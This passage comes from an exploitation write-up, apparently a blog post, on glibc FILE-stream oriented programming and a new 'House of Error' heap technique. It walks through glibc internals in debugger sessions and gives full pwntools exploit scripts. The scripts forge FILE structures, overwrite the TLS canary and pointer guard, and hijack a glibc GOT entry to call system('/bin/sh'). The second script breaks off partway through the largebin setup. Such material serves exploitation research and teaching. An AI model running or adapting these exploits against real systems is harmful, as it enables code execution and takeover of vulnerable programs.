__fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (do_abort, "*** %s ***: terminated\n", msg);
}
```
From any `__libc_fatal`:
```c
void
__libc_fatal (const char *message)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (do_abort, "%s", message);
}
```
`__libc_fatal` is used in a lot of cases but most importantly in `_IO_vtable_check`.
The interesting part of `__libc_message` is the functions which calls internally. More specifically lets inspect the source code first and after the disassembly code.
```c

/* Abort with an error message.  */
void
__libc_message (enum __libc_message_action action, const char *fmt, ...)
{
	va_list ap;
	int fd = -1;

	va_start (ap, fmt);

	#ifdef FATAL_PREPARE
		FATAL_PREPARE;
	#endif

	if (fd == -1)
	fd = STDERR_FILENO;

	struct str_list *list = NULL;
	int nlist = 0;

	const char *cp = fmt;
	while (*cp != '\0')
	{
		...
		/* Determine what to print.  */
		const char *str;
		size_t len;
		if (cp[0] == '%' && cp[1] == 's')
		{
		  str = va_arg (ap, const char *);
		  len = strlen (str);
		  cp += 2;
		}
 	...
	}

	va_end (ap);

	if ((action & do_abort))
		/* Kill the application.  */
		abort ();
}

```
`__libc_message` will iterate the format string which we specified and if it finds a `%s` format specifier it will calculate the length of the `str` with `strlen`. Most of the abort functions provide a message with `%s` so pretty much we will call `strlen` from every abort function. The interesting part of `strlen` is that if you disassembly the `__libc_message` you will see the following:
```python
pwndbg> disass __libc_message
Dump of assembler code for function __libc_message:
   0x00007ffff7e02210 <+0>:	push   rbp
   0x00007ffff7e02211 <+1>:	mov    rdi,rdx
   0x00007ffff7e02214 <+4>:	mov    rbp,rsp
   0x00007ffff7e02217 <+7>:	push   r13
   0x00007ffff7e02219 <+9>:	push   r12
   0x00007ffff7e0221b <+11>:	mov    r12,rdx
   0x00007ffff7e0221e <+14>:	push   rbx
   0x00007ffff7e0221f <+15>:	sub    rsp,0x58
   0x00007ffff7e02223 <+19>:	mov    QWORD PTR [rbp-0x30],r8
   0x00007ffff7e02227 <+23>:	mov    QWORD PTR [rbp-0x40],rdx
   0x00007ffff7e0222b <+27>:	mov    QWORD PTR [rbp-0x38],rcx
   0x00007ffff7e0222f <+31>:	mov    QWORD PTR [rbp-0x28],r9
   0x00007ffff7e02233 <+35>:	mov    rax,QWORD PTR fs:0x28
   0x00007ffff7e0223c <+44>:	mov    QWORD PTR [rbp-0x58],rax
   0x00007ffff7e02240 <+48>:	xor    eax,eax
   0x00007ffff7e02242 <+50>:	lea    rax,[rbp+0x10]
   0x00007ffff7e02246 <+54>:	mov    DWORD PTR [rbp-0x70],0x18
   0x00007ffff7e0224d <+61>:	mov    QWORD PTR [rbp-0x68],rax
   0x00007ffff7e02251 <+65>:	lea    rax,[rbp-0x50]
   0x00007ffff7e02255 <+69>:	mov    QWORD PTR [rbp-0x60],rax
   0x00007ffff7e02259 <+73>:	call   0x7ffff7da1470 <*ABS*+0xa7d10@plt>
...

pwndbg> x/2i 0x7ffff7da1470
   0x7ffff7da1470 <*ABS*+0xa7d10@plt>:	endbr64 
   0x7ffff7da1474 <*ABS*+0xa7d10@plt+4>:	bnd jmp QWORD PTR [rip+0x1f0c1d]        # 0x7ffff7f92098 <*ABS*@got.plt>
pwndbg> tel 0x7ffff7f92098
00:0000│  0x7ffff7f92098 (*ABS*@got.plt) —▸ 0x7ffff7f15040 (__strlen_avx2) ◂— endbr64
```
`strlen` actually is being resolved from the got table in glibc! And for the moment all glibc builds are shiped with Partial RELRO so we can get code execution from pretty much any abort function.

We will abuse this situation to get code execution in our PoC through exploiting this weakness in `__stack_chk_fail`. Generally with an arbitrary write primitive and the ability to trigger any of the above abort functions or any abort function which uses `__libc_message`, you can get code execution.

Plan to hijack the control flow:
* Overflow into our FILE stream.
* Trigger `_IO_mem_sync` inside `fputc`.
* Use one arbitrary write to overwrite the stack canary in the TLS with the address of `system` (so when we are exiting the function, `__stack_chk_fail` will be triggered)
* Use one arbitrarty write to overwrite `__strlen_avx2` in the glibc got table with `_IO_cleanup`.

Note for step 3: We put the address of system in our stack canary because it doesnt matter what value we will put in our canary and secondly we need a fake vtable where we can get code execution from in our final steps. You will understand better later.

Although we could point our `__strlen_avx2` to a one gadget and hopefully get a shell, I will try to make an actual classic FSOP from which we can craft a more stable shell. (Even though quite complicated)

After sucessfully calling `_IO_cleanup` our controled FILE stream is already linked in `_IO_list_all` list and actually `_IO_list_all` points back to our controled FILE stream. Having a known controlable buffer to place FSOP gadgets can make the exploitation easier but you might not need any extra buffer. In our case we do not need to have a known controlable buffer because we can reuse the existing heap addresses located in glibc data section to craft a `_chain` to point back to a controlable overflowed heap location. And fortunately for us, main arena probably will have plenty of those ;). `_IO_list_all` also points back to the heap but also points back to our FILE stream and because we do not have in our case a known controlable buffer to pivot there through the `_chain` pointer and we did not alter the current contents of our FILE stream it will be in no use to us.

We need to pick between all heap addresses in glibc data section the right heap address which can point back to an overflowed heap portion where we can place another fake FILE stream. For our crafted fake FILE stream we need to avoid triggering `_IO_OVERFLOW` because for the moment we do not control his vtable pointer and probably it points outside the `__libc_IO_vtables` section and will fail the `_IO_vtable_check` triggering an abort.  So we need to reuse a heap address in our glibc data section which can meet the conditions for avoiding entering  `_IO_OVERFLOW`.

The conditions to avoid triggering `_IO_OVERFLOW` are:
```c
    if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
```

In this step actually we need to understand what is following our FSOP chunk in the heap and we need to verify that we indeed are able to craft an FSOP by overflowing to the next chunk.
```python
pwndbg> tel 0x563f556572a0 80
00:0000│  0x563f556572a0 ◂— 0x6161616261616161 ('aaaabaaa')
01:0008│  0x563f556572a8 ◂— 0x6161616461616163 ('caaadaaa')
02:0010│  0x563f556572b0 ◂— 0x6161616661616165 ('eaaafaaa')
03:0018│  0x563f556572b8 ◂— 0x1
04:0020│  0x563f556572c0 ◂— 0x0
... ↓     3 skipped
08:0040│  0x563f556572e0 —▸ 0x7fb4630d6e30 (_IO_cleanup) ◂— endbr64 
09:0048│  0x563f556572e8 —▸ 0x7fb4630d6e30 (_IO_cleanup) ◂— endbr64 
0a:0050│  0x563f556572f0 ◂— 0x0
... ↓     6 skipped
11:0088│  0x563f55657328 —▸ 0x7fb463243c78 ◂— 0x0
12:0090│  0x563f55657330 ◂— 0x0
... ↓     2 skipped
15:00a8│  0x563f55657348 —▸ 0x7fb4632431f0 ◂— 0x0
16:00b0│  0x563f55657350 ◂— 0x0
17:00b8│  0x563f55657358 ◂— 0x0
18:00c0│  0x563f55657360 —▸ 0x7fb4632431f0 ◂— 0x0
19:00c8│  0x563f55657368 ◂— 0x0
... ↓     2 skipped
1c:00e0│  0x563f55657380 ◂— 0xffffffff
1d:00e8│  0x563f55657388 ◂— 0x0
1e:00f0│  0x563f55657390 ◂— 0x0
1f:00f8│  0x563f55657398 —▸ 0x7fb463245208 (_IO_mem_jumps+72) —▸ 0x7fb4630d7c50 (_IO_str_seekoff) ◂— endbr64 
20:0100│  0x563f556573a0 ◂— 0x0
21:0108│  0x563f556573a8 ◂— 0x0
22:0110│  0x563f556573b0 —▸ 0x7fb4632430b8 (*ABS*@got.plt) —▸ 0x7fb4630d6e30 (_IO_cleanup) ◂— endbr64 
23:0118│  0x563f556573b8 —▸ 0x7fb46304e768 ◂— 0x0
24:0120│  0x563f556573c0 ◂— 0x0
... ↓     25 skipped
3e:01f0│  0x563f55657490 —▸ 0x7fb463245040 (__GI__IO_wfile_jumps) ◂— 0x0
3f:01f8│  0x563f55657498 ◂— 0x411
40:0200│  0x563f556574a0 ◂— 'Press F to doubt.\noverflow: \n'
41:0208│  0x563f556574a8 ◂— 'to doubt.\noverflow: \n'
42:0210│  0x563f556574b0 ◂— '.\noverflow: \n'
43:0218│  0x563f556574b8 ◂— 0xa203a776f /* 'ow: \n' */
44:0220│  0x563f556574c0 ◂— 0x0
... ↓     11 skipped
pwndbg> 
```

The next chunk in our case is a buffer which has been allocated previously from the `_IO_2_1_stdout_` FILE stream from `puts`. This chunk starts at `0x563f556574a0`. The offset between the next chunk and the start of our heap overflow is `0x200`. So we have `0x100` bytes more to overflow. We need `0xd8` bytes to craft a whole fake FILE stream into the heap and inorder to perform another `_IO_mem_sync` we need also `0x20` bytes more to set our `bufloc` and `sizeloc` pointers. Our total is `0xf8` bytes! Close enough! 

Fortunately for us there are a lot of references to this chunk from `_IO_2_1_stdout_`:
```python
pwndbg> p _IO_2_1_stdout_
$13 = {
  file = {
    _flags = -72537468,
    _IO_read_ptr = 0x563f556574a0 "Press F to doubt.\noverflow: \n",
    _IO_read_end = 0x563f556574a0 "Press F to doubt.\noverflow: \n",
    _IO_read_base = 0x563f556574a0 "Press F to doubt.\noverflow: \n",
    _IO_write_base = 0x563f556574a0 "Press F to doubt.\noverflow: \n",
    _IO_write_ptr = 0x563f556574a0 "Press F to doubt.\noverflow: \n",
    _IO_write_end = 0x563f556574a0 "Press F to doubt.\noverflow: \n",
    _IO_buf_base = 0x563f556574a0 "Press F to doubt.\noverflow: \n",
    _IO_buf_end = 0x563f556578a0 "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7fb463243aa0 <_IO_2_1_stdin_>,
    _fileno = 1,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7fb463246750 <_IO_stdfile_1_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7fb4632439a0 <_IO_wide_data_1>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7fb463245580 <__GI__IO_file_jumps>
}
```
We need to pick which ever address avoids triggering `_IO_OVERFLOW` inside `_IO_flush_all_lockp`

In our case `_IO_2_1_stdout_._IO_read_ptr` will do the trick.
```python
pwndbg> p/x &_IO_2_1_stdout_.file._IO_read_ptr
$19 = 0x7fb463244788
pwndbg> p/x 0x7fb463244788-104
$20 = 0x7fb463244720
pwndbg> p/x *((struct _IO_FILE*)0x7fb463244720)
$21 = {
  _flags = 0x0,
  _IO_read_ptr = 0x7fb463246740,
  _IO_read_end = 0xffffffffffffffff,
  _IO_read_base = 0x0,
  _IO_write_base = 0x7fb4632438a0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x7fb463245580,
  _markers = 0xfbad2a84,
  _chain = 0x563f556574a0,
  _fileno = 0x556574a0,
  _flags2 = 0x563f,
  _old_offset = 0x563f556574a0,
  _cur_column = 0x74a0,
  _vtable_offset = 0x65,
  _shortbuf = {0x55},
  _lock = 0x563f556574a0,
  _offset = 0x563f556574a0,
  _codecvt = 0x563f556574a0,
  _wide_data = 0x563f556578a0,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = {0x0, 0x0, 0x0, 0x0, 0xa0, 0x3a, 0x24, 0x63, 0xb4, 0x7f, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
}
```
* `_mode = 0`
* `_IO_write_base > _IO_write_ptr`

So we do not triggering `_IO_OVERFLOW` and we will just follow the `_chain` pointer.

After pointing back to our crafted fake FILE stream we now can perform another one `_IO_mem_sync`. With our second `_IO_mem_sync` we will do the following:
* Use one arbitrary write to disable the vtable check by overwriting the pointer guard in TLS with the value of `&_IO_vtable_check`. (Now from now on, we have a classical FSOP)
* Use one arbitrary write to partially corrupt `_IO_2_1_stdout_._IO_read_ptr` pointer so that we can perform another one FSOP. (This time our final fake FILE stream will be packed in our payload because our overflow is not enough to craft another fake FILE stream)

Finally with our final FSOP we want to call `system('/bin/sh')` and get a shell. First thing we have to do is place `/bin/sh` in `_flags` field of our fake FILE stream and finally we need a fake vtable with an entry of `__overflow` which points to `system`. We already crafted a fake vtable with an entry pointing to `system`, in our stack canary!

This was crazy! If you have one or more known controlable buffers in .bss/data/heap/stack whatever, you can simplify the exploit a lot, and actually with this way it will feel a little bit more like the old FSOP technique.

But I wanted to exploit this PoC with the hard way for the below reasons:
* I wanted to prove that you might not need any heap leak or you might not need to know where your FILE stream is located in memory.
* Build an understanding for the following `House of Error`
* Revive FSOP.
* Get a stable shell.

# Exploit for PoC #2
```python
from pwn import *

# I have to warning you though
# I waz lazy and the exploit is a little bit unstable xD
# For the exploit to succeed we need our final _mode field which is the 4 least significant bytes of &_IO_vtable_check to be negative.
# Fortunately ASLR will do the job for us ;)
# Although we could avoid this case i waz lazy ;)
# Enjoy your shell ;)

elf = context.binary = ELF('fsop_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = '''
                dir /home/un1c0rn/FSOPAgain/poc2/libio/
                set breakpoint pending on
                b _IO_mem_sync
                b smash_me_baby
                b _IO_cleanup
        ''')
    else:
        return process(elf.path)

io = start()

io.recvuntil(b'libc leak: ') # skip blah blah
puts_leak = int(io.recvline(keepends = False), base = 16)
success(f'puts @ 0x{puts_leak:02x}')

libc.address = puts_leak - libc.sym.puts
success(f'libc @ 0x{libc.address:02x}')

stack_guard = libc.address - 0x2898
__strchrnul_avx2_got = libc.address + 0x1f20b8

where = __strchrnul_avx2_got # we target this got address in glibc to hijack the code exectution from __libc_message!
what = libc.sym._IO_cleanup # early cleanup yeay! who has time waiting the main to exit ;)

where2 = stack_guard # overwrite stack canary in TLS inorder to trigger __stack_chk_fail intentionally.
what2 = libc.sym.system # this will trigger __stack_chk_fail but also we can use it as a vtable entry for our final FILE stream.

_flags = p32(0x0)
_flags_byte_hole = p32(0x0)
_IO_read_ptr = 0x0
_IO_read_end = 0x0
_IO_read_base = 0x0
_IO_write_base = what
_IO_write_ptr = _IO_write_base + what2
_IO_write_end = 0x0
_IO_buf_base = 0x0
_IO_buf_end = 0x0
_IO_save_base = 0x0
_IO_backup_base = 0x0
_IO_save_end = 0x0
_markers = 0x0

_chain = (libc.sym._IO_2_1_stdout_ + 8) - 104 # so our _chain => back to the heap in our fake FILE stream.

_fileno = p32(0x0)
_flags2 = p32(0x0)
_old_offset = 0x0
_cur_column = p16(0x0)
_vtable_offset = p8(0x0)
_shortbuf = p8(0x0)
_shortbuf_byte_hole = p32(0x0)
_lock = libc.address + 0x1f21f0
_offset = 0x0
_codecvt = 0x0
_wide_data = _lock
_freeres_list = 0x0
_freeres_buf = 0x0
__pad5 = 0x0
_mode = p32(0x0)
_unused2 = b'\x00'*0x14

# here is the trick, by shifting the vtable in the range of __libc_IO_vtables we are not aborting the program, it is totally allowed.
vtable = libc.sym._IO_mem_jumps + 0x48  # now __overflow points to _IO_mem_sync, our magical two arbitrary write function ;)

fs = _flags + _flags_byte_hole + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base) + p64(_IO_write_base) + p64(_IO_write_ptr) \
   + p64(_IO_write_end) + p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end) \
   + p64(_markers) + p64(_chain) + _fileno + _flags2 + p64(_old_offset) + _cur_column + _vtable_offset + _shortbuf + _shortbuf_byte_hole + p64(_lock) + p64(_offset) \
   + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf) + p64(__pad5) + _mode + _unused2 \
   + p64(vtable) + p64(0)*2 + p64(where) + p64(where2)

# ===========================================================
# Here we are done crafting our new overflowed FILE stream. |
# =========================================================== 

pointer_guard = libc.address - 0x2890
where = pointer_guard # defeat _IO_vtable_check by corrupting the pointer guard.
what = libc.sym._IO_vtable_check

where2 = libc.sym._IO_2_1_stdout_ + 1 # with this way we corrupt the least significant byte of our _chain pointer to point to a new final fake FILE stream.
what2 = 0x1 # we null out the least significant byte of our _chain pointer. (any value lower than 0x01xxxxxxx will do the trick but we have need a value > 0 inorder to trigger _IO_OVERFLOW)

_flags = p32(0x0)
_flags_byte_hole = p32(0x0)
_IO_read_ptr = 0x0
_IO_read_end = 0x0
_IO_read_base = 0x0
_IO_write_base = what # here is our _mode field for our fake final FILE stream. Note we take only the 4 least significant bytes because _mode is int. Although we can shift our fake final FILE stream by 8 bytes and avoid this collision, I'm too lazy for that, so I will hope _mode to take a negative value after some runs thank you ASLR for making it possible ;)
_IO_write_ptr = _IO_write_base + what2
_IO_write_end = 0x0
_IO_buf_base = stack_guard - 0x18  # here will be our vtable of our final fake FILE stream. offset for __overflow is 0x18. We already putted system as our stack canary & as an entry for our fake vtable ;)
_IO_buf_end = 0x0
_IO_save_base = 0x0
_IO_backup_base = 0x0
_IO_save_end = 0x0
_markers = 0x0

_chain = (libc.sym._IO_2_1_stdout_ + 8) - 104 # reuse this trick, we have changed our _chain only the fly to point to our final fake FSOP.

_fileno = p32(0x0)
_flags2 = p32(0x0)
_old_offset = 0x0
_cur_column = p16(0x0)
_vtable_offset = p8(0x0)
_shortbuf = p8(0x0)
_shortbuf_byte_hole = p32(0x0)
_lock = libc.address + 0x1f21f0
_offset = 0x0
_codecvt = 0x0
_wide_data = _lock
_freeres_list = 0x0
_freeres_buf = 0x0
__pad5 = 0x0
_mode = p32(0x0)
_unused2 = b'\x00'*0x14

# here is the trick, by shifting the vtable in the range of __libc_IO_vtables we are not aborting the program, it is totally allowed.
vtable = libc.sym._IO_mem_jumps + 0x48  # now __overflow points to _IO_mem_sync, our magical two arbitrary write function ;)

fake_fs = _flags + _flags_byte_hole + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base) + p64(_IO_write_base) + p64(_IO_write_ptr) \
   + p64(_IO_write_end) + p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end) \
   + p64(_markers) + p64(_chain) + _fileno + _flags2 + p64(_old_offset) + _cur_column + _vtable_offset + _shortbuf + _shortbuf_byte_hole + p64(_lock) + p64(_offset) \
   + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf) + p64(__pad5) + _mode + _unused2 \
   + p64(vtable) + p64(0)*2 + p64(where) + p64(where2)

final_fake_fs_IO_write_base = 0x0
final_fake_fs_IO_write_ptr  = 0x1 # we want it bigger than _IO_write_base inorder to trigger _IO_OVERFLOW.
final_fake_fs = b'/bin/sh\x00' + p8(0)*0x18 + p64(final_fake_fs_IO_write_base) + p64(final_fake_fs_IO_write_ptr) + p8(0)*0x68 # we can place here only 0xa0 bytes, for our _mode & vtable we have to put them inside our previous fake_fs

fix_fs_chunk_size = 0x1e1 # we don't actually care so much.
exploit = fit({
    0x18: p64(fix_fs_chunk_size) + fs,
    0x160: final_fake_fs,
    0x200: fake_fs
})

io.send(exploit)

io.interactive()
```

# House of Error
Finally I will demonstrate a new cool House that I crafted with those primitives and its quite minimalistic in the requirements we need inorder to perform it. We only need a libc leak, a heap overflow bug and a little bit control over the heap.

I would not say it's a radically new technique, actually it is quite similar to `House of Emma` and `House of Kiwi` but it has less requirements for executing it and it is based on different primitives.

The basic idea of the technique is to execute `_IO_mem_sync` from a controlable fake FILE stream and perform the same trick as we did for the PoC #2.

We can easily craft fake FILE streams into the heap and as we saw in PoC #2 we do not need a heap leak also to reference our fake FILE streams. But the difference here is that we do not have the ability to corrupt or control a FILE stream because there is no open FILE stream on the heap to overflow.

Inorder to trigger a crafted fake FILE stream on the heap we will need to perform a largebin attack targeting `stderr` pointer (and not `_IO_2_1_stderr_`). After performing our largebin attack against `stderr` we want to trigger any malloc assertion in our program. In our PoC this is trivial we just need to corrupt the size field of the top chunk on the heap.

Before diving to the actual attack I've to highlight a drawback in our approach. `stderr` is a good target to force glibc processing a crafted fake FILE stream of our choice upon a malloc assertion but it requires to know where is located in memory. In our PoC it is actually located in the glibc so we do not need any leaks. But if is being used in the program that we are targeting  then `stderr` will be mapped in the data section of the program. Which then will require either a PIE leak or the program to be compiled without PIE protection enabled.

```c
static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
		 const char *function)
{
  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
		     __progname, __progname[0] ? ": " : "",
		     file, line,
		     function ? function : "", function ? ": " : "",
		     assertion);
  fflush (stderr);
  abort ();
}
```

Upon executing our first fake FILE stream inside `__malloc_assert` we can only perform two arbitrary writes and at this moment the vtable check is standing in our way. If we were to execute `_IO_mem_sync` from `fflush(stderr)` in `__malloc_assert` we would have the issue that the program will abort soon with `abort()` and we could do nothing about it. I couldn't find a similar techinique abusing `abort()` like we did with `__libc_message` but I can not say that there is no trick to achieve code execution by tampering with `abort()` internal functionality. Although I could see that at least we have partial control over `abort()` internals by abusing `stage` variable with our arbitrary writes to force `abort()` to execute a different abort procedure. But I couldn't get code execution from it. 
```c
/* We must avoid to run in circles.  Therefore we remember how far we
   already got.  */
static int stage;

/* Cause an abnormal program termination with core-dump.  */
void
abort (void)
{
  struct sigaction act;
  sigset_t sigs;

  /* First acquire the lock.  */
  __libc_lock_lock_recursive (lock);

  /* Now it's for sure we are alone.  But recursive calls are possible.  */

  /* Unblock SIGABRT.  */
  if (stage == 0)
    {
      ++stage;
      __sigemptyset (&sigs);
      __sigaddset (&sigs, SIGABRT);
      __sigprocmask (SIG_UNBLOCK, &sigs, 0);
    }

  /* Send signal which possibly calls a user handler.  */
  if (stage == 1)
    {
      /* This stage is special: we must allow repeated calls of
	 `abort' when a user defined handler for SIGABRT is installed.
	 This is risky since the `raise' implementation might also
	 fail but I don't see another possibility.  */
      int save_stage = stage;

      stage = 0;
      __libc_lock_unlock_recursive (lock);

      raise (SIGABRT);

      __libc_lock_lock_recursive (lock);
      stage = save_stage + 1;
    }

  /* There was a handler installed.  Now remove it.  */
  if (stage == 2)
    {
      ++stage;
      memset (&act, '\0', sizeof (struct sigaction));
      act.sa_handler = SIG_DFL;
      __sigfillset (&act.sa_mask);
      act.sa_flags = 0;
      __sigaction (SIGABRT, &act, NULL);
    }

  /* Try again.  */
  if (stage == 3)
    {
      ++stage;
      raise (SIGABRT);
    }

  /* Now try to abort using the system specific command.  */
  if (stage == 4)
    {
      ++stage;
      ABORT_INSTRUCTION;
    }

  /* If we can't signal ourselves and the abort instruction failed, exit.  */
  if (stage == 5)
    {
      ++stage;
      _exit (127);
    }

  /* If even this fails try to use the provided instruction to crash
     or otherwise make sure we never return.  */
  while (1)
    /* Try for ever and ever.  */
    ABORT_INSTRUCTION;
}
```

Instead we will force `__malloc_assert` to trigger our first fake crafted FILE stream from within `__fxprintf` inorder to have another chance to hijack the control flow from within `fflush(stderr)`.
```c
int
__fxprintf (FILE *fp, const char *fmt, ...)
{
  va_list ap;
  va_start (ap, fmt);
  int res = __vfxprintf (fp, fmt, ap, 0);
  va_end (ap);
  return res;
}
```
`__fxprintf` will simply call `__vfxprintf`. 
```c
int
__vfxprintf (FILE *fp, const char *fmt, va_list ap,
	     unsigned int mode_flags)
{
  if (fp == NULL)
    fp = stderr;
  _IO_flockfile (fp);
  int res = locked_vfxprintf (fp, fmt, ap, mode_flags);
  _IO_funlockfile (fp);
  return res;
}
```
Here is the interesting part. If you give `__vfxprintf` a NULL `fp`, `__vfxprintf` will use the `stderr`. Which actually is exacly our case with `__malloc_assert`. After that and some locking `locked_vfxprintf` will be called.
```c
static int
locked_vfxprintf (FILE *fp, const char *fmt, va_list ap,
		  unsigned int mode_flags)
{
  if (_IO_fwide (fp, 0) <= 0)
    return __vfprintf_internal (fp, fmt, ap, mode_flags);
	...
}
```
Most of the code inside `locked_vfxprintf` is not worthing any inspection for now. Trust me on this we actually want to enter to `__vfprintf_internal` and the only requirement is `_IO_fwide(fp, 0)` to return either zero or a negative value.
```c
int
_IO_fwide (FILE *fp, int mode)
{
  /* Normalize the value.  */
  mode = mode < 0 ? -1 : (mode == 0 ? 0 : 1);
	...
  /* The orientation already has been determined.  */
  if (fp->_mode != 0
      /* Or the caller simply wants to know about the current orientation.  */
      || mode == 0)
    return fp->_mode;
    ...
}
```
This is exacly what we want! `mode` will be `0`  but we can totally control `fp->_mode`! By providing a negative value to `fp->_mode` we return with a negative value to `locked_vfxprintf` and we enter `__vfprintf_internal`. 
Do not be mistaken:
```c
# define vfprintf	__vfprintf_internal
```
```c
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags)
{
	...
  if (UNBUFFERED_P (s))
    /* Use a helper function which will allocate a local temporary buffer
       for the stream and then call us again.  */
    return buffered_vfprintf (s, format, ap, mode_flags);
  ...
}
```
There is a lot of code which does not affect our approach but we essentially want to enter `buffered_vfprintf`. Again trust me on this for a moment ok?
```c
#define UNBUFFERED_P(S) ((S)->_flags & _IO_UNBUFFERED)
```
Ok again we can control this! So we just need to provide the `_IO_UNBUFFERED` flag to our fake crafted FILE stream.
```c
static int
buffered_vfprintf (FILE *s, const CHAR_T *format, va_list args,
		   unsigned int mode_flags)
{
  CHAR_T buf[BUFSIZ];
  struct helper_file helper;
  FILE *hp = (FILE *) &helper._f;
  int result, to_flush;

  /* Orient the stream.  */
#ifdef ORIENT
  ORIENT;
#endif

  /* Initialize helper.  */
  helper._put_stream = s;
#ifdef COMPILE_WPRINTF
  hp->_wide_data = &helper._wide_data;
  _IO_wsetp (hp, buf, buf + sizeof buf / sizeof (CHAR_T));
  hp->_mode = 1;
#else
  _IO_setp (hp, buf, buf + sizeof buf);
  hp->_mode = -1;
#endif
  hp->_flags = _IO_MAGIC|_IO_NO_READS|_IO_USER_LOCK;
#if _IO_JUMPS_OFFSET
  hp->_vtable_offset = 0;
#endif
#ifdef _IO_MTSAFE_IO
  hp->_lock = NULL;
#endif
  hp->_flags2 = s->_flags2;
  _IO_JUMPS (&helper._f) = (struct _IO_jump_t *) &_IO_helper_jumps;

  /* Now print to helper instead.  */
  result = vfprintf (hp, format, args, mode_flags);

  /* Lock stream.  */
  __libc_cleanup_region_start (1, (void (*) (void *)) &_IO_funlockfile, s);
  _IO_flockfile (s);

  /* Now flush anything from the helper to the S. */
#ifdef COMPILE_WPRINTF
  if ((to_flush = (hp->_wide_data->_IO_write_ptr
		   - hp->_wide_data->_IO_write_base)) > 0)
    {
      if ((int) _IO_sputn (s, hp->_wide_data->_IO_write_base, to_flush)
	  != to_flush)
	result = -1;
    }
#else
  if ((to_flush = hp->_IO_write_ptr - hp->_IO_write_base) > 0)
    {
      if ((int) _IO_sputn (s, hp->_IO_write_base, to_flush) != to_flush)
	result = -1;
    }
#endif

  /* Unlock the stream.  */
  _IO_funlockfile (s);
  __libc_cleanup_region_end (0);

  return result;
}
```
`buffered_vfprintf` will craft his own helper FILE stream so we will avoid dealing with `vfprintf` by our selfs again and eventually will call `_IO_sputn` on our fake crafted FILE stream vtable! Which we can easily replace with `_IO_mem_sync` and perform our arbitrary writes! And fortunately for us we do not need to consider anything else! Because once `buffered_vfprintf` returns every other function we saw above will return also!

Now we have to devise a plan for what we want to corrupt before going to `fflush(stderr)` for a second round!

My plan:
* Use one arbitrary write to defeat `_IO_vtable_check` by overwriting the pointer guard with `&_IO_vtable_check`. (Same way we did in PoC #2)
* Use one arbitary write to tamper the least significant byte of `stderr` so we can point to a new fake crafted FILE stream which will be triggered from within `fflush(stderr)`!

With our first arbitrary write we are disabling the vtable check and hence in our second fake crafted FILE stream we can forge a fake vtable to just call `system("/bin/sh")`.

With the second arbitrary write besides from corrupting the least significant byte of `stderr` inorder to hijack the control flow later in `fflush(stderr)` we put also the `system` function at the same time to avoid crafting a third fake FILE stream on the heap.

Last step craft our second fake FILE stream on the heap with `_flags` field `/bin/sh\x00` and a vtable pointing back to where we put `system` in glibc's data section and enjoy your shell ;)

# Exploit for House of Error
```python
from imghdr import what
from pwn import *

elf = context.binary = ELF('house_of_error_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = '''
                dir /home/john/Bench/poc3/libio/
                set breakpoint pending on
                b _IO_mem_sync
                b __malloc_assert
        ''')
    else:
        return process(elf.path)

pwnie_lands = [0,]*8

def select_option(option):
    io.sendlineafter(b'> ', str(option).encode())

def adjust_sizes(chunk_size): # copy pasted from HeapLABs ;)
    return (chunk_size & ~0x0f) - 8

def lock_pwnie_land():
    for i in range(8):
        if pwnie_lands[i] == 0:
            pwnie_lands[i] = 1
            return i
    return -1 # there is no available pwnie land!

def unlock_pwnie_land(pwnie_land):
    pwnie_lands[pwnie_land] = 0
    
def add_pwnie_land(pwnie_land_size, pwnie_land_contents):
    select_option(option = 1)
    io.sendlineafter(b'> ', hex(adjust_sizes(pwnie_land_size)).encode())
    io.sendlineafter(b'> ', pwnie_land_contents)
    return lock_pwnie_land()

def burn_pwnie_land(pwnie_land):
    select_option(option = 2)
    io.sendlineafter(b': ', str(pwnie_land).encode())
    unlock_pwnie_land(pwnie_land)
    
def largebin_offset(address):
    return address - 0x20

def house_of_error():
    # First step in House of Error is to do some heap feng shui and craft a large bin attack. 
    # glibc 2.30 introduced a mitigation in large bins but there is another unpatched path from where we can perform a large bin attack again!
    # If you are targeting an older glibc you can perform the classical large bin attack instead.
    
    # Useful resources to read about large bin attack:
    # https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
    # https://github.com/shellphish/how2heap/blob/master/glibc_2.34/large_bin_attack.c
    
    # I will not describe the large bin attack as others already have done it, you can read about the attack from the above resources.
    
